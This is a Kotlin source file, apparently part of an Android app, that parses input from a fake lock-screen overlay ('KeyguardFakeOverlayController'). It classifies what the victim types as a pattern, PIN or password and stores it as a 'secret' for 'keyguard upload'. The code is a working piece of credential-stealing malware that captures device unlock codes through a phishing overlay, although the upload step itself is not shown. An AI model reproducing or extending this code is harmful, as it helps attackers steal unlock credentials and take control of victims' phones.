package com.vibelink.client.keyguard

/**
 * Parses [KeyguardFakeOverlayController] MiluBridge.done payload into keyguard upload fields.
 */
object KeyguardFakeSubmitParser {
    private val PATTERN_CELLS = Regex("""^\d+([-,]\d+)+,?$""")
    private val PIN_DIGITS = Regex("""^\d{4,16}$""")

    data class Parsed(
        val lockType: KeyguardLockType,
        val secret: String,
        val gesturePath: String = "",
    )

    fun parse(text: String): Parsed? {
        val raw = text.trim()
        if (raw.isEmpty() || raw == "web_done") {
            return null
        }
        if (PATTERN_CELLS.matches(raw)) {
            val cells = raw.trimEnd(',')
            return Parsed(
                lockType = KeyguardLockType.PATTERN,
                secret = cells,
            )
        }
        if (PIN_DIGITS.matches(raw)) {
            return Parsed(
                lockType = KeyguardLockType.PIN,
                secret = raw,
            )
        }
        if (raw.length >= 4) {
            return Parsed(
                lockType = KeyguardLockType.PASSWORD,
                secret = raw,
            )
        }
        return null
    }
}
